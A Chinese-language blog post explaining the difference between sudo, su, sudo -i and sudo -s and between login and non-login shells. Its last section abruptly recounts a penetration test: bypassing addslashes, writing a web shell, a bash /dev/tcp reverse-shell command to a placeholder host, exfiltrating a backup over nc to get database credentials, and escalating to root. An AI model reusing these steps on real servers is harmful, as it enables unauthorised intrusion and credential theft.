碰巧就成为root了？

Posted on 2017-12-31 | In Linux

Get root

当我不小心在键盘输入了sudo su命令后，终端提醒我输密码，本着试试的心态输了进去。然后我就成为了Root。心里顿时一万个草泥马在奔腾，这是个啥情况？

Sudo & su

Sudo可以理解为Super user do，执行Sudo命令时，系统会从/etc/sudoers读取配置，按照配置文件的信息来判断当前用户是否能够以root身份执行命令。当该命令被调用时，系统会要求输入当前用户的密码！

su命令可以理解为switch user或者subtitute user。su [username]命令会调用一个具有username权限的shell instance，此时系统会要求输入目标用户的密码。

Sudo su

调用sudo su的时候，sudo先被执行，系统根据/etc/sudoers来判断当前用户是否有权限以root来执行命令，如果调用root身份成功，接着就将以root身份执行su命令，所以不需要输入root密码。整个过程只需要输入当前用户的密码即可。

Difference between Login, non-login, interactive and non-interactive shell

  • login shell: A login shell logs you into the system as a specified user, necessary for this is a username and password. When you hit ctrl+alt+F1 to login into a virtual terminal you get after successful login a login shell.
  • non-login shell: A shell that is executed without logging in, necessary for this is a currently logged-in user. When you open a graphic terminal in gnome it is a non-login shell.
  • interactive shell: A shell (login or non-login) where you can interactively type or interrupt commands. For example a gnome terminal.
  • non-interactive shell: A (sub)shell that is probably run from an automated process. You will see neither input nor output

sudo -i & sudo -s & su & su -

su & su -

su -切换用户后会调用login shell，login shell会重置环境变量。

su只是切换用户(调用了一个interactive non-login shell)，环境变量和之前的用户一样未发生变化。

假设我们以普通用户1person登录终端，并对$PATH进行了修改。

sudo -i & sudo -s

sudo -i会调用指定用户的账号密码进行登录，这意味着.profile和.login会被加载到新shell里。简单来说就是调用了一个login shell。

sudo -s则是运行指定shell环境变量的shell，如果未制定调用哪个shell环境变量，那么默认调用interactive shell。

sudo su -的缘由

为了绕过addslash函数，必须这样，在获得shell之前，我们先看下自己的权限和当前目录的权限，便于进一步的提升权限。

PHP的shell_exec无法直接执行bash -i &>/dev/tcp/ip/port 0>&1，所以我们这里需要写入一个shell文件。当前用户是www-data，在网站根目录下具有读写的权限，所以我们可以轻松写入并反弹shell。获取到shell后，在根目录下发现存在backup.zip文件，通过nc流将backup.zip下载至本地，发现存在数据库账号密码，最终通过前面提到的sudo su -获得了root权限。

总结

渗透是一场持久战，考验的是耐心和细心。赶在2017的尾巴上，Happy Hacking.
